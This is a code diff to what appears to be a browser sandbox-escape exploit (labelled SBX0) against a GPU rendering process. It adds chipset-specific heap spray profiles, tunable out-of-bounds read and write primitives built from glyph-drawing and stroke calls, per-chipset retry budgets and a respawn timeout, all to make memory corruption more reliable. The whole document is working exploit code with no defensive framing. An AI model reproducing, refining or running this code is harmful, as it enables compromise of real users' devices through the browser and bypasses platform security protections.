@@ -7065,6 +7065,34 @@
         [1, 0x100]
       ]
     },
+    compact_write_soft: {
+      name: "compact_write_soft",
+      pixelUnpackFill: 0x8015c8,
+      midSprays: [
+        [3, 0x100],
+        [0x1d - 1, 0x1000]
+      ],
+      tailSprays: [
+        [1, 0x100]
+      ],
+      primitiveTuning: {
+        writePrepStrokeCount: 5
+      }
+    },
+    compact_write_min: {
+      name: "compact_write_min",
+      pixelUnpackFill: 0x8015c8,
+      midSprays: [
+        [3, 0x100],
+        [0x1d - 1, 0x1000]
+      ],
+      tailSprays: [
+        [1, 0x100]
+      ],
+      primitiveTuning: {
+        writePrepStrokeCount: 3
+      }
+    },
     compact_alt_fill: {
       name: "compact_alt_fill",
       pixelUnpackFill: 0xaac7ab,
@@ -7105,8 +7133,27 @@
     "f35b705e8c57ae59e369ebc9145a9dbc": spray_profiles.compact_alt_fill,
     "43ba9900ff2fc7d9d32072540b2cab12": spray_profiles.wide,
     "c90776dbac058ed6957f476e287867f8": spray_profiles.wide,
-    "22f32fd975a694d340a6ad22b872b1ae": spray_profiles.wide,
-    "6149d995753968891870832e3fec9195": spray_profiles.compact
+    "22f32fd975a694d340a6ad22b872b1ae": spray_profiles.wide
+  };
+  const chipset_fallback_profile_sequences = {
+    "c33e4990a9d3afe948b98d7d4205d596": [
+      spray_profiles.compact
+    ],
+    "6149d995753968891870832e3fec9195": [
+      spray_profiles.compact
+    ]
+  };
+  const chipset_inprocess_attempt_budget = {
+    "c33e4990a9d3afe948b98d7d4205d596": {
+      default: 1,
+      "agx oob failed": 2,
+      "coreanimation oob failed": 1
+    },
+    "6149d995753968891870832e3fec9195": {
+      default: 3,
+      "agx oob failed": 1,
+      "coreanimation oob failed": 3
+    }
   };
   const fallback_spray_profiles = [
     spray_profiles.compact,
@@ -7114,6 +7161,36 @@
     spray_profiles.wide_alt_fill,
     spray_profiles.wide
   ];
+  const active_fallback_spray_profiles = chipset_fallback_profile_sequences[chipset] || fallback_spray_profiles;
+  const fallback_spray_profile_count = active_fallback_spray_profiles.length;
+  let fallback_spray_start_index = parseInt(sbx0_fallback_start, 10);
+  if (!isFinite(fallback_spray_start_index)) fallback_spray_start_index = 0;
+  fallback_spray_start_index %= fallback_spray_profile_count;
+  if (fallback_spray_start_index < 0) fallback_spray_start_index += fallback_spray_profile_count;
+  function currentExploitAttemptCount() {
+    return Math.max(0, retry_count - 1);
+  }
+  function currentInProcessAttemptBudget(reason) {
+    if (chipset_spray_profile[chipset]) return Infinity;
+    const budget = chipset_inprocess_attempt_budget[chipset];
+    if (!budget) return Infinity;
+    if (typeof budget === 'number') return budget;
+    if (reason && isFinite(budget[reason])) return budget[reason];
+    if (isFinite(budget.default)) return budget.default;
+    return Infinity;
+  }
+  function shouldAbortInProcessRetry(reason) {
+    if (chipset_spray_profile[chipset]) return false;
+    const max_attempts = currentInProcessAttemptBudget(reason);
+    if (!isFinite(max_attempts)) return false;
+    return currentExploitAttemptCount() >= max_attempts;
+  }
+  function abortInProcessRetry(reason) {
+    const attempts = currentExploitAttemptCount();
+    const max_attempts = currentInProcessAttemptBudget(reason);
+    LOG(`[x] ${reason}; aborting in-process retries after ${attempts}/${max_attempts} attempt(s)`);
+    throw new Error(`SBX0 retry budget exhausted: ${reason}`);
+  }
   (function SBX0() {
     if (retry_count >= 150) {
       LOG(`[!] SBX0 max retries (${retry_count}) reached, aborting`);
@@ -7264,6 +7341,7 @@
     let dirty_read_count = 0;
     let glObjectIndex = 1;
     let fragmentShader = 0;
+    let active_spray_profile = null;
     function initGLProgram() {
       const vertexShader = glObjectIndex++;
       glConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteGraphicsContextGL_CreateShader, glConnection.identifier).encode('uint32_t', vertexShader).encode('uint32_t', GL_VERTEX_SHADER));
@@ -7328,8 +7406,27 @@
       if (known_profile) {
         return known_profile;
       }
-      const fallback_index = Math.max(0, retry_count - 2) % fallback_spray_profiles.length;
-      return fallback_spray_profiles[fallback_index];
+      const fallback_index = (fallback_spray_start_index + Math.max(0, retry_count - 2)) % active_fallback_spray_profiles.length;
+      return active_fallback_spray_profiles[fallback_index];
+    }
+    const default_primitive_tuning = {
+      firstStrokeCount: 9,
+      firstGlyphLength: 0x6a8,
+      secondStrokeCount: 2,
+      secondGlyphLength: 0x6f0,
+      readCorruptionIndex: 0x1a6,
+      readCorruptionRounds: 10,
+      writePrepStrokeCount: 7,
+      thirdGlyphLength: 0x688,
+      writeValueDelta: 0xa0n,
+      writeTailDelta: 0x140n
+    };
+    function currentPrimitiveTuning() {
+      const tuning = Object.assign({}, default_primitive_tuning);
+      if (active_spray_profile && active_spray_profile.primitiveTuning) {
+        Object.assign(tuning, active_spray_profile.primitiveTuning);
+      }
+      return tuning;
     }
     function applySprayPlan(plan) {
       for (const [count, size] of plan) {
@@ -7339,6 +7436,10 @@
     function oob() {
       LOG(`oob()`);
       const spray_profile = currentSprayProfile();
+      active_spray_profile = spray_profile;
+      if (!chipset_spray_profile[chipset] && retry_count <= 2) {
+        LOG(`unknown chipset fallback_start=${fallback_spray_start_index} profile_count=${active_fallback_spray_profiles.length}`);
+      }
       LOG(`spray profile: ${spray_profile.name} chipset=${chipset}`);
       const width = 1;
       const height = 0x200;
@@ -7389,12 +7490,14 @@
     }
     function preparePrimitives() {
       LOG("preparePrimitives");
+      const primitive_tuning = currentPrimitiveTuning();
+      LOG(`primitive tuning: writePrepStrokeCount=${primitive_tuning.writePrepStrokeCount} thirdGlyphLength=0x${primitive_tuning.thirdGlyphLength.toString(16)}`);
       cache_id = RemoteRenderingBackend_CacheFont();
       LOG(`Cache font ID: ${cache_id.hex()}`);
-      for (let i = 0; i < 9; i++) {
+      for (let i = 0; i < primitive_tuning.firstStrokeCount; i++) {
         if (!RemoteDisplayListRecorder_StrokeRect(imageBufferIdentifiers[dirtyWriteIndex], 0, 0, 0, 0x100 + i, 0x100 + i, timeout = crash_timeout)) return false;
       }
-      const draw_glyphs_length = 0x6a8;
+      const draw_glyphs_length = primitive_tuning.firstGlyphLength;
       const glyphs = new BigUint64Array(draw_glyphs_length / 0x8 * 0x2);
       glyphs[glyphs.length - 4] = 0n;
       glyphs[glyphs.length - 3] = 0n;
@@ -7402,13 +7505,13 @@
       glyphs[glyphs.length - 1] = 0x20000n;
       const glyphs_u8 = new Uint8Array(glyphs.buffer, 0, draw_glyphs_length * 2);
       if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex], cache_id, glyphs_u8, new Uint8Array(draw_glyphs_length * 0x10), draw_glyphs_length, timeout = crash_timeout)) return false;
-      for (let i = 0; i < 2; i++) {
+      for (let i = 0; i < primitive_tuning.secondStrokeCount; i++) {
         if (!RemoteDisplayListRecorder_StrokeRect(imageBufferIdentifiers[dirtyWriteIndex + 1], 0, 0, 0, 0x100 + i, 0x100 + i, timeout = crash_timeout)) return false;
       }
-      const draw_glyphs_second_length = 0x6f0;
+      const draw_glyphs_second_length = primitive_tuning.secondGlyphLength;
       const glyphs_second = new BigUint64Array(draw_glyphs_second_length / 0x8 * 0x2);
-      let read_corruption_index = 0x1a6;
-      for (let i = 0; i < 10; i++) {
+      let read_corruption_index = primitive_tuning.readCorruptionIndex;
+      for (let i = 0; i < primitive_tuning.readCorruptionRounds; i++) {
         glyphs_second[read_corruption_index + 0] = 0n;
         glyphs_second[read_corruption_index + 1] = 0n;
         glyphs_second[read_corruption_index + 2] = 0x10000n;
@@ -7467,11 +7570,12 @@
       const AGXA13FamilyBuffer = rxMtlBuffer_data_u64[3];
       LOG(`AGXA13FamilyBuffer: ${AGXA13FamilyBuffer.hex()}`);
       const write_addr = pthread_tls + offsets.privateState_off + offsets.vertexAttribVector_off;
-      const write_value = AGXA13FamilyBuffer + 0xa0n;
-      for (let i = 0; i < 7; i++) {
+      const write_value = AGXA13FamilyBuffer + primitive_tuning.writeValueDelta;
+      LOG(`write_addr: ${write_addr.hex()} write_value: ${write_value.hex()}`);
+      for (let i = 0; i < primitive_tuning.writePrepStrokeCount; i++) {
         if (!RemoteDisplayListRecorder_StrokeRect(imageBufferIdentifiers[dirtyWriteIndex + 1], 0, 0, 0, 0x100 + i, 0x100 + i, timeout = crash_timeout)) return false;
       }
-      const draw_glyphs_third_length = 0x688;
+      const draw_glyphs_third_length = primitive_tuning.thirdGlyphLength;
       const glyphs_third = new BigUint64Array(draw_glyphs_third_length / 0x8 * 0x2);
       glyphs_third[glyphs_third.length - 6] = 0n;
       glyphs_third[glyphs_third.length - 5] = 0n;
@@ -7481,7 +7585,7 @@
       glyphs_third[glyphs_third.length - 1] = 0x0n;
       const glyphs_third_u8 = new Uint8Array(glyphs_third.buffer, 0, draw_glyphs_third_length * 2);
       if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex + 1], cache_id, glyphs_third_u8, new Uint8Array(draw_glyphs_third_length * 0x10), draw_glyphs_third_length, timeout = crash_timeout)) return false;
-      RemoteDisplayListRecorder_SetCTM(imageBufferIdentifiers[dirtyWriteIndex + 3], 0n, 0n, 0n, write_value, write_value + 0x140n, write_value + 0x140n);
+      RemoteDisplayListRecorder_SetCTM(imageBufferIdentifiers[dirtyWriteIndex + 3], 0n, 0n, 0n, write_value, write_value + primitive_tuning.writeTailDelta, write_value + primitive_tuning.writeTailDelta);
       if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 3], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
       return true;
     }
@@ -7563,7 +7667,10 @@
       fcall(offsets.WebProcess_ensureGPUProcessConnection, webProcess);
       fcall(offsets.pthread_setspecific, runLoopHolder_tid, 0n);
     }
-    function respawn_gpu_process_and_retry() {
+    function respawn_gpu_process_and_retry(reason = 'retry requested') {
+      if (shouldAbortInProcessRetry(reason)) {
+        abortInProcessRetry(reason);
+      }
       LOG(`[-] going to respawn gpu process`);
       gpuProcessConnectionClosed();
       ensureGPUProcessConnection();
@@ -7572,7 +7679,14 @@
       const connection = read64(gpuProcessConnection + 0x20n);
       LOG(`waiting for sendPort`);
       read64_biguint64arr[1] = connection + 0x138n;
-      while (!read64_str.charCodeAt(0));
+      {
+        const port_wait_begin = performance.now();
+        while (!read64_str.charCodeAt(0)) {
+          if (performance.now() - port_wait_begin > 5000) {
+            ASSERT_NOT_REACHED('sendPort not received after GPU respawn (5s timeout)');
+          }
+        }
+      }
       LOG(`received sendPort`);
       const maybe_port = read32(connection + 0x138n);
       LOG(`maybe_port: ${maybe_port.hex()}`);
@@ -7669,11 +7783,11 @@
     initGLProgram();
     if (!oob()) {
       LOG("GPU crashed at agx oob");
-      return respawn_gpu_process_and_retry();
+      return respawn_gpu_process_and_retry('agx oob failed');
     }
     if (!preparePrimitives()) {
       LOG("GPU crashed at CoreAnimation oob");
-      return respawn_gpu_process_and_retry();
+      return respawn_gpu_process_and_retry('coreanimation oob failed');
     }
     gpu_slow_write64(offsets.free_slabs, 0n);
     LOG(`offsets.free_slabs: ${offsets.free_slabs.hex()}`);
